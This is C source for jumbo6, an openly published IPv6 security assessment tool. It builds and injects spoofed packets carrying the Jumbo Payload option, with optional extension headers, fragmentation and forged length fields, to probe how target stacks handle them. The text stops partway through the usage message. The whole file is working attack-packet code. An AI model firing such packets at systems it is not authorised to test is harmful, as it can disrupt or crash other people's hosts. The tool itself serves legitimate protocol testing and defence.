/*
 * jumbo6: A security assessment tool that exploits potential flaws in the
 *         processing of IPv6 Jumbo payloads
 *
 * Copyright (C) 2011-2013 Fernando Gont <fgont@si6networks.com>
 *
 * Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * 
 * Build with: make jumbo6
 * 
 * The libpcap library must be previously installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/select.h>

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <ifaddrs.h>
#include <pcap.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <net/if.h>
#ifdef __linux__
	#include <netpacket/packet.h>
#elif defined (__FreeBSD__) || defined(__NetBSD__) || defined (__OpenBSD__) || defined(__APPLE__) || ( !defined(__FreeBSD__) && defined(__FreeBSD_kernel__))
	#include <net/if_dl.h>
#endif

#include "jumbo6.h"
#include "libipv6.h"
#include "ipv6toolkit.h"


/* Function prototypes */
void				init_packet_data(struct iface_data *);
int					send_packet(struct iface_data *, struct pcap_pkthdr *, const u_char *);
void 				print_icmp6_echo(struct iface_data *, struct pcap_pkthdr *, const u_char *);
void 				print_icmp6_error(struct iface_data *, struct pcap_pkthdr *, const u_char *);
void				print_attack_info(struct iface_data *);
void				usage(void);
void				print_help(void);
int 				valid_icmp6_response(struct iface_data *, struct pcap_pkthdr *, const u_char *);

/* Used for router discovery */
struct prefix_entry	*prefix_ols[MAX_PREFIXES_ONLINK], *prefix_acs[MAX_PREFIXES_AUTO];
struct prefix_entry	*prefix_local[MAX_LOCAL_ADDRESSES];
struct in6_addr		randprefix;
unsigned char		randpreflen;

/* Data structures for packets read from the wire */
struct pcap_pkthdr	*pkthdr;
const u_char		*pktdata;
unsigned char		*pkt_end;
struct ether_header	*pkt_ether;
struct ip6_hdr		*pkt_ipv6;
struct icmp6_hdr	*pkt_icmp6;
struct nd_neighbor_solicit *pkt_ns;
struct in6_addr		*pkt_ipv6addr;
unsigned int		pktbytes;

bpf_u_int32			my_netmask;
bpf_u_int32			my_ip;
struct bpf_program	pcap_filter;
char 				dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char		buffer[65556], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
unsigned char		*v6buffer, *ptr, *startofprefixes;
char				*pref;
    
struct ip6_hdr		*ipv6;
struct icmp6_hdr	*icmp6;

struct ether_header	*ethernet;
struct nd_opt_tlla	*tllaopt;

struct in6_addr		targetaddr;
struct ether_addr	linkaddr[MAX_TLLA_OPTION];
unsigned int		nlinkaddr=0, linkaddrs;

char				*lasts, *rpref;
char				*charptr;

size_t				nw;
unsigned long		ul_res, ul_val;
unsigned int		i, j, startrand;
unsigned int		skip;
unsigned int		sources, nsources, ports, nports, nsleep;

u_int16_t			mask, ip6length;
u_int32_t			jplength, *jplengthptr, *fjplengthptr, icmp6psize;
u_int8_t			hoplimit;

char 				plinkaddr[ETHER_ADDR_PLEN];
char 				psrcaddr[INET6_ADDRSTRLEN], pdstaddr[INET6_ADDRSTRLEN], pv6addr[INET6_ADDRSTRLEN];
unsigned char 		floodt_f=0;
unsigned char 		listen_f=0, accepted_f=0, loop_f=0, sleep_f=0, localaddr_f=0;
unsigned char		hoplimit_f=0, ip6length_f=0, jplength_f=0, icmp6psize_f=0;


/* Support for Extension Headers */
unsigned int		dstopthdrs, dstoptuhdrs, hbhopthdrs;
char				hbhopthdr_f=0, dstoptuhdr_f=0, dstopthdr_f=0;
unsigned char		*dstopthdr[MAX_DST_OPT_HDR], *dstoptuhdr[MAX_DST_OPT_U_HDR];
unsigned char		*hbhopthdr[MAX_HBH_OPT_HDR];
unsigned int		dstopthdrlen[MAX_DST_OPT_HDR], dstoptuhdrlen[MAX_DST_OPT_U_HDR];
unsigned int		hbhopthdrlen[MAX_HBH_OPT_HDR], m, pad;

struct ip6_frag		fraghdr, *fh;
struct ip6_hdr		*fipv6;
unsigned char		fragh_f=0;
unsigned char		fragbuffer[ETHER_HDR_LEN+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD];
unsigned char		*fragpart, *fptr, *fptrend, *ptrend, *ptrhdr, *ptrhdrend;
unsigned int		hdrlen, ndstopthdr=0, nhbhopthdr=0, ndstoptuhdr=0;
unsigned int		nfrags, fragsize, max_packet_size, linkhsize;
unsigned char		*prev_nh, *startoffragment;

struct iface_data	idata;

int main(int argc, char **argv){
	extern char		*optarg;	
	char			*endptr; /* Used by strtoul() */
	fd_set			sset, rset;
	struct timeval	timeout;
	int				r, sel;
	time_t			curtime, start, lastecho=0;

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"link-src-addr", required_argument, 0, 'S'},
		{"link-dst-addr", required_argument, 0, 'D'},
		{"src-address", required_argument, 0, 's'},
		{"dst-address", required_argument, 0, 'd'},
		{"hop-limit", required_argument, 0, 'A'},
		{"dst-opt-hdr", required_argument, 0, 'u'},
		{"dst-opt-u-hdr", required_argument, 0, 'U'},
		{"hbh-opt-hdr", required_argument, 0, 'H'},
		{"frag-hdr", required_argument, 0, 'y'},
		{"ipv6-length", required_argument, 0, 'q'},
		{"jumbo-length", required_argument, 0, 'Q'},
		{"payload-size", required_argument, 0, 'P'},
		{"loop", no_argument, 0, 'l'},
		{"sleep", required_argument, 0, 'z'},
		{"listen", no_argument, 0, 'L'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'}
	};

	char shortopts[]= "i:s:d:A:u:U:H:y:S:D:q:Q:P:lz:Lvh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}

	hoplimit=64+random()%180;
	init_iface_data(&idata);

	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option) {
			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				idata.iface[IFACE_LENGTH-1]=0;
				idata.ifindex= if_nametoindex(idata.iface);
				idata.iface_f=TRUE;
				break;

			case 's':	/* IPv6 Source Address */
				if(idata.srcaddr_f){
					puts("Error: Multiple '-s' options have been specified");
					exit(EXIT_FAILURE);
				}

				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Source Address");
					exit(EXIT_FAILURE);
				}

				if ( inet_pton(AF_INET6, charptr, &(idata.srcaddr)) <= 0){
					puts("inet_pton(): Source Address not valid");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr_f = 1;
		
				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					idata.srcpreflen = atoi(charptr);
		
					if(idata.srcpreflen>128){
						puts("Prefix length error in IPv6 Source Address");
						exit(EXIT_FAILURE);
					}

					sanitize_ipv6_prefix(&(idata.srcaddr), idata.srcpreflen);
					idata.srcprefix_f=1;
				}

				break;
	    
			case 'd':	/* IPv6 Destination Address */
				if( inet_pton(AF_INET6, optarg, &(idata.dstaddr)) <= 0){
					puts("inet_pton(): address not valid");
					exit(EXIT_FAILURE);
				}
		
				idata.dstaddr_f = 1;
				break;

			case 'A':	/* Hop Limit */
				hoplimit= atoi(optarg);
				hoplimit_f=1;
				break;

			case 'u':	/* Destinations Options Header */
				if(ndstopthdr >= MAX_DST_OPT_HDR){
					puts("Too many Destination Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				dstopthdrlen[ndstopthdr]= hdrlen;

				if( (dstopthdr[ndstopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstopthdr[ndstopthdr] + 2;
				ptrhdrend= dstopthdr[ndstopthdr] + hdrlen;

				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;
			
					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header Too Big");
						exit(EXIT_FAILURE);
					}
		    
					ptrhdr= ptrhdr + pad;
				}

				*(dstopthdr[ndstopthdr]+1)= (hdrlen/8)-1;
				ndstopthdr++;
				dstopthdr_f=1;
				break;

			case 'U':	/* Destination Options Header (Unfragmentable Part) */
				if(ndstoptuhdr >= MAX_DST_OPT_U_HDR){
					puts("Too many Destination Options Headers (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen < 8){
					puts("Bad length in Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				hdrlen = ((hdrlen+7)/8) * 8;
				dstoptuhdrlen[ndstoptuhdr]= hdrlen;
		
				if( (dstoptuhdr[ndstoptuhdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Destination Options Header (Unfragmentable Part)");
					exit(EXIT_FAILURE);
				}

				ptrhdr= dstoptuhdr[ndstoptuhdr]+2;
				ptrhdrend= dstoptuhdr[ndstoptuhdr] + hdrlen;
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Destination Options Header (Unfragmentable Part) Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(dstoptuhdr[ndstoptuhdr]+1)= (hdrlen/8) - 1;
				ndstoptuhdr++;
				dstoptuhdr_f=1;
				break;

			case 'H':	/* Hop-by-Hop Options Header */
				if(nhbhopthdr >= MAX_HBH_OPT_HDR){
					puts("Too many Hop-by-Hop Options Headers");
					exit(EXIT_FAILURE);
				}

				hdrlen= atoi(optarg);
		
				if(hdrlen <= 8){
					puts("Bad length in Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}
		    
				hdrlen = ((hdrlen+7)/8) * 8;
				hbhopthdrlen[nhbhopthdr]= hdrlen;
		
				if( (hbhopthdr[nhbhopthdr]= malloc(hdrlen)) == NULL){
					puts("Not enough memory for Hop-by-Hop Options Header");
					exit(EXIT_FAILURE);
				}

				ptrhdr= hbhopthdr[nhbhopthdr] + 2;
				ptrhdrend= hbhopthdr[nhbhopthdr] + hdrlen;
		
		
				while( ptrhdr < ptrhdrend){

					if( (ptrhdrend-ptrhdr)>257)
						pad= 257;
					else
						pad= ptrhdrend-ptrhdr;

					if(!insert_pad_opt(ptrhdr, ptrhdrend, pad)){
						puts("Hop-by-Hop Options Header Too Big");
						exit(EXIT_FAILURE);
					}

					ptrhdr = ptrhdr + pad;
				}

				*(hbhopthdr[nhbhopthdr]+1)= (hdrlen/8) - 1;
				nhbhopthdr++;
				hbhopthdr_f=1;
				break;

			case 'y':	/* Fragment header */
				nfrags= atoi(optarg);
				if(nfrags < 8){
					puts("Error in Fragmentation option: Fragment Size must be at least 8 bytes");
					exit(EXIT_FAILURE);
				}
		
				nfrags = (nfrags +7) & 0xfff8;
				fragh_f= 1;
				break;

			case 'S':	/* Source Ethernet address */
				if(ether_pton(optarg, &(idata.hsrcaddr), sizeof(idata.hsrcaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hsrcaddr_f = 1;
				break;

			case 'D':	/* Destination Ethernet Address */
				if(ether_pton(optarg, &(idata.hdstaddr), sizeof(idata.hdstaddr)) == 0){
					puts("Error in Source link-layer address.");
					exit(EXIT_FAILURE);
				}
		
				idata.hdstaddr_f = 1;
				break;

			case 'P':	/* Payload Size*/
				icmp6psize= atoi(optarg);
				icmp6psize= (icmp6psize<<2) >> 2; /* The Redirected Header has a granularity of 8 bytes */ 
				icmp6psize_f= 1;
				break;

			case 'q':	/* IPv6 Payload Length */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'TCP Sequence NUmber' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					ip6length = ul_res;
					ip6length_f=1;
				}
				break;

			case 'Q':	/* Jumbo Payload Length */
				if((ul_res = strtoul(optarg, &endptr, 0)) == ULONG_MAX){
					perror("Error in 'TCP Sequence NUmber' parameter");
					exit(EXIT_FAILURE);
				}
		
				if(endptr != optarg){
					jplength = ul_res;
					jplength_f=1;
				}

				break;

			case 'l':	/* "Loop mode */
				loop_f = 1;
				break;

			case 'z':	/* Sleep option */
				nsleep=atoi(optarg);
				if(nsleep==0){
					puts("Invalid number of seconds in '-z' option");
					exit(EXIT_FAILURE);
				}
	
				sleep_f=1;
				break;

			case 'L':	/* "Listen mode */
				listen_f = 1;
				break;

			case 'v':	/* Be verbose */
				idata.verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
		
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */

	if(geteuid()) {
		puts("jumbo6 needs root privileges to run.");
		exit(EXIT_FAILURE);
	}

	if(!idata.iface_f){
		if(idata.dstaddr_f && IN6_IS_ADDR_LINKLOCAL(&(idata.dstaddr))){
			puts("Must specify a network interface for link-local destinations");
			exit(EXIT_FAILURE);
		}
		else if(idata.listen_f){
			puts("Must specify a network interface when employing the 'listenging' mode");
			exit(EXIT_FAILURE);
		}
	}

	if(listen_f && loop_f){
		puts("'Error: listen' mode and 'loop' mode are incompatible");
		exit(EXIT_FAILURE);
	}

	if(!idata.dstaddr_f && !listen_f){	/* Must specify IPv6 Destination Address if listening mode not used */
		puts("IPv6 Destination Address not specified (and listening mode not selected)");
		exit(EXIT_FAILURE);
	}

	if(load_dst_and_pcap(&idata, LOAD_SRC_NXT_HOP) == FAILURE){
		puts("Error while learning Souce Address and Next Hop");
		exit(EXIT_FAILURE);
	}

	release_privileges();

	srandom(time(NULL));

	if((idata.ip6_local_flag && idata.ip6_global_flag) && !idata.srcaddr_f)
		localaddr_f=1;

	if(!idata.ether_flag){
		randomize_ether_addr(&idata.ether);
		idata.ether_flag=1;
	}

	if(!idata.ip6_local_flag){
		ether_to_ipv6_linklocal(&idata.ether, &idata.ip6_local);
	}

	if(!sleep_f)
		nsleep=QUERY_TIMEOUT;

	if( !fragh_f && dstoptuhdr_f){
		puts("Dst. Options Header (Unfragmentable Part) set, but Fragmentation not specified");
		exit(EXIT_FAILURE);
	}
    
	if(fragh_f)
		max_packet_size = MAX_IPV6_PAYLOAD + MIN_IPV6_HLEN;
	else
		max_packet_size = ETH_DATA_LEN;

	if(idata.verbose_f){
		print_attack_info(&idata);
	}

	/*
	   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Parameter Problem
	 */
	if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NS_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
		printf("pcap_compile(): %s", pcap_geterr(idata.pfd));
		exit(EXIT_FAILURE);
	}
    
	if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
		printf("pcap_setfilter(): %s", pcap_geterr(idata.pfd));
		exit(EXIT_FAILURE);
	}

	pcap_freecode(&pcap_filter);

	/* Set initial contents of the attack packet */
	init_packet_data(&idata);
    
	/* Fire a TCP segment if an IPv6 Destination Address was specified */
	if(idata.dstaddr_f){
		if( (idata.fd= pcap_fileno(idata.pfd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		start= time(NULL); 

		while(1){
			curtime=time(NULL);

			if(!loop_f && (curtime - start) >= QUERY_TIMEOUT){
				break;
			}

			if((curtime - lastecho) >= nsleep){
				lastecho=curtime;

				puts("Sending ICMPv6 Echo Request....\n");

				if(send_packet(&idata, NULL, NULL) == -1){
					puts("Error sending packet");
					exit(EXIT_FAILURE);
				}
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= nsleep;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, Neighbor Solicitation, or ICMPv6 Error */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (ETHER_HDR_LEN + MIN_IPV6_HLEN))
				continue;

			if(pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6){
				if(pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
					if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
						continue;
					/* 
					    If the addresses that we're using are not actually configured on the local system
					    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
					    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
					    will take care of that.
					 */
					if(!localaddr_f && is_eq_in6_addr(&(pkt_ns->nd_ns_target), &idata.srcaddr)){
							if(send_neighbor_advert(&idata, idata.pfd, pktdata) == -1){
								puts("Error sending Neighbor Advertisement");
								exit(EXIT_FAILURE);
							}
					}
				}
				else if( (pkt_icmp6->icmp6_type == ICMP6_ECHO_REPLY) || (pkt_icmp6->icmp6_type == ICMP6_PARAM_PROB)){
					if( (pkt_end - (unsigned char *) pkt_icmp6) < sizeof(struct icmp6_hdr))
						continue;
					/*
					   Do a preliminar validation check on the ICMPv6 packet (packet size, Source Address,
					   and Destination Address).
					 */
					if(!valid_icmp6_response(&idata, pkthdr, pktdata)){
						continue;
					}

					switch(pkt_icmp6->icmp6_type){
						case ICMP6_ECHO_REPLY:
							print_icmp6_echo(&idata, pkthdr, pktdata);
							break;

						case ICMP6_PARAM_PROB:
							print_icmp6_error(&idata, pkthdr, pktdata);
							break;
					}
				}
			}
		}
		
		exit(EXIT_SUCCESS);
	}

	if(!idata.dstaddr_f){
		puts("Error: Nothing to send! (Destination Address left unspecified)");
		exit(EXIT_FAILURE);
	}

	exit(EXIT_SUCCESS);
}


/*
 * Function: print_icmp6_info()
 *
 * Print information about a received ICMPv6 Echo Response packet
 */
void print_icmp6_echo(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	printf("Response from %s\n", pv6addr);
}


/*
 * Function: print_icmp6_error()
 *
 * Print information about a received ICMPv6 error message
 */
void print_icmp6_error(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6;
	struct icmp6_hdr	*pkt_icmp6;


	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	printf("Response from %s: ICMPv6 Parameter Problem ", pv6addr);

	switch(pkt_icmp6->icmp6_code){
		case ICMP6_PARAMPROB_HEADER:
			printf("Code 0 (Erroneous Header field), Pointer: %lu\n", (LUI) ntohl(pkt_icmp6->icmp6_pptr));
			break;

		case ICMP6_PARAMPROB_NEXTHEADER:
			printf("Code 1 (Unrecognized Next Header type), Pointer: %lu\n", (LUI) ntohl(pkt_icmp6->icmp6_pptr));
			break;

		case ICMP6_PARAMPROB_OPTION:
			printf("Unrecognized IPv6 option), Pointer: %lu\n", (LUI) ntohl(pkt_icmp6->icmp6_pptr));
			break;
	}
}


/*
 * Function: init_packet_data()
 *
 * Initialize the contents of the attack packet (Ethernet header, IPv6 Header, and ICMPv6 header)
 * that are expected to remain constant for the specified attack.
 */
void init_packet_data(struct iface_data *idata){
	struct dlt_null *dlt_null;
	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata->type == DLT_EN10MB && idata->flags != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}
	else if(idata->type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;
	ipv6->ip6_dst= idata->dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	/*
	 * We include a Hop by Hop Options header that will include the Jumbo Payload option.
	 * The user may specify additionaly HBH option headers.
	 */

	*prev_nh = IPPROTO_HOPOPTS;
	prev_nh = ptr;

	ptr++;
	*ptr= 0; /* HBH len */
	ptr++;
	*ptr= IP6OPT_JUMBO; /* Option type */
	ptr++;
	*ptr= 4; /* Option length */
	ptr++;
	jplengthptr= (u_int32_t *) ptr;
	ptr+=4;


	if(hbhopthdr_f){
		hbhopthdrs=0;
	
		while(hbhopthdrs < nhbhopthdr){
			if((ptr+ hbhopthdrlen[hbhopthdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing HBH Opt. Header");
				exit(EXIT_FAILURE);
			}
	    
			*prev_nh = IPPROTO_HOPOPTS;
			prev_nh = ptr;
			memcpy(ptr, hbhopthdr[hbhopthdrs], hbhopthdrlen[hbhopthdrs]);
			ptr = ptr + hbhopthdrlen[hbhopthdrs];
			hbhopthdrs++;
		}
	}

	if(dstoptuhdr_f){
		dstoptuhdrs=0;
	
		while(dstoptuhdrs < ndstoptuhdr){
			if((ptr+ dstoptuhdrlen[dstoptuhdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing Dest. Opt. Header (Unfrag. Part)");
				exit(EXIT_FAILURE);
			}

			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstoptuhdr[dstoptuhdrs], dstoptuhdrlen[dstoptuhdrs]);
			ptr = ptr + dstoptuhdrlen[dstoptuhdrs];
			dstoptuhdrs++;
		}
	}

	/* Everything that follows is the Fragmentable Part of the packet */
	fragpart = ptr;

	if(fragh_f){
		/* Check that we are able to send the Unfragmentable Part, together with a 
		   Fragment Header and a chunk data over our link layer
		 */
		if( (fragpart+sizeof(fraghdr)+nfrags) > (v6buffer+ETH_DATA_LEN)){
			puts("Unfragmentable part too large for current MTU (1500 bytes)");
			exit(EXIT_FAILURE);
		}

		/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
		   This Fragment Header will be used (an assembled with the rest of the packet by the 
		   send_packet() function.
		*/
		bzero(&fraghdr, FRAG_HDR_SIZE);
		*prev_nh = IPPROTO_FRAGMENT;
		prev_nh = (unsigned char *) &fraghdr;
	}

	if(dstopthdr_f){
		dstopthdrs=0;
	
		while(dstopthdrs < ndstopthdr){
			if((ptr+ dstopthdrlen[dstopthdrs]) > (v6buffer+max_packet_size)){
			puts("Packet too large while processing Dest. Opt. Header (should be using the Frag. option?)");
			exit(EXIT_FAILURE);
			}
    
			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstopthdr[dstopthdrs], dstopthdrlen[dstopthdrs]);
			ptr = ptr + dstopthdrlen[dstopthdrs];
			dstopthdrs++;
		}
	}


	*prev_nh = IPPROTO_ICMPV6;

	icmp6 = (struct icmp6_hdr *) ptr;
	icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
	icmp6->icmp6_code = 0;
	icmp6->icmp6_cksum = 0;
	icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
	icmp6->icmp6_data16[1]= htons(random());	/* Sequence Number */

	ptr+= sizeof(struct icmp6_hdr);

	for(i=0; i< (icmp6psize/4); i++){
		*(u_int32_t *)ptr = random();
		ptr += sizeof(u_int32_t);
	}

	icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-((unsigned char *)icmp6), IPPROTO_ICMPV6);

	startofprefixes=ptr;
}



/*
 * Function: send_packet()
 *
 * Initialize the remaining fields of the Neighbor Advertisement Message, and
 * send the attack packet(s).
 */
int send_packet(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	ptr= startofprefixes;

	if(!fragh_f){
		if(ip6length_f)
			ipv6->ip6_plen= htons(ip6length);
		else
			ipv6->ip6_plen= htons(0);

		if(jplength_f)
			*jplengthptr= htonl(jplength);
		else
			*jplengthptr= htonl((ptr - v6buffer) - MIN_IPV6_HLEN);

		if((nw=pcap_inject(idata->pfd, buffer, ptr - buffer)) == -1){
			printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
			exit(EXIT_FAILURE);
		}

		if(nw != (ptr-buffer)){
			printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", \
						(LUI) nw, (LUI) (ptr-buffer));
			exit(EXIT_FAILURE);
		}
	}
	else{
		ptrend= ptr;
		ptr= fragpart;
		fptr = fragbuffer;
		fipv6 = (struct ip6_hdr *) (fragbuffer + ETHER_HDR_LEN);
		fptrend = fptr + ETHER_HDR_LEN+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD;
		fjplengthptr= (u_int32_t *) (fptr + sizeof(struct ether_header) + sizeof(struct ip6_hdr) + 3);
		/* We copy everything from the Ethernet header till the end of the Unfragmentable part */
		memcpy(fptr, buffer, fragpart-buffer);
		fptr = fptr + (fragpart-buffer);

		/* Check whether there is still room to add a Fragmentation Header */
		if( (fptr+FRAG_HDR_SIZE)> fptrend){
			puts("Unfragmentable Part is Too Large");
			exit(EXIT_FAILURE);
		}

		/* Copy the Fragmentation Header */
		memcpy(fptr, (char *) &fraghdr, FRAG_HDR_SIZE);
		fh= (struct ip6_frag *) fptr;
		fh->ip6f_ident=random();
		startoffragment = fptr + FRAG_HDR_SIZE;

		/*
		 * Check that the selected fragment size is not larger than the largest 
		 * fragment size that can be sent
		 */
		if(nfrags <= (fptrend - fptr))
			fragsize=nfrags;
		else
			fragsize= (fptrend-fptr) & IP6F_OFF_MASK;

		m=IP6F_MORE_FRAG;

		while((ptr< ptrend) && m==IP6F_MORE_FRAG){
			fptr= startoffragment;

			if( (ptrend-ptr) <= fragsize){
				fragsize= ptrend-ptr;
				m=0;
			}

			memcpy(fptr, ptr, fragsize);
			fh->ip6f_offlg = (htons(ptr-fragpart) & IP6F_OFF_MASK) | m;
			ptr+=fragsize;
			fptr+=fragsize;

			fipv6->ip6_plen = htons((fptr - fragbuffer) - MIN_IPV6_HLEN - ETHER_HDR_LEN);

			if(ip6length_f)
				fipv6->ip6_plen = htons(ip6length);
			else
				fipv6->ip6_plen= htons(0);

			if(jplength_f)
				*fjplengthptr= htonl(jplength);
			else
				*fjplengthptr= htonl((fptr - fragbuffer) - MIN_IPV6_HLEN - ETHER_HDR_LEN);


			if((nw=pcap_inject(idata->pfd, fragbuffer, fptr - fragbuffer)) == -1){
				printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
				exit(EXIT_FAILURE);
			}

			if(nw != (fptr- fragbuffer)){
				printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", \
														(LUI) nw, (LUI) (ptr-buffer));
				exit(EXIT_FAILURE);
			}
		} /* Sending fragments */
	} /* Sending fragmented datagram */

	return(0);
}



/*
 * Function: usage()
 *
 * Prints the syntax of the jumbo6 tool
 */
void usage(void){
	puts("usage: jumbo6 -i INTERFACE [-S LINK_SRC_ADDR] [-D LINK-DST-ADDR]\n"
	     "       [-s SRC_ADDR[/LEN]] [-d DST_ADDR] [-A HOP_LIMIT] [-H HBH_OPT_HDR_SIZE] \n"
	     "       [-U DST_OPT_U_HDR_SIZE] [-y FRAG_SIZE] [-u DST_OPT_HDR_SIZE]\n"
	     "       [-q IPV6_LENGTH] [-Q JUMBO_LENGTH] [-P PAYLOAD_SIZE] [-j PREFIX[/LEN]]\n"
	     "       [-k PREFIX[/LEN]] [-J LINK_ADDR] [-K LINK_ADDR] [-b PREFIX[/LEN]]\n"
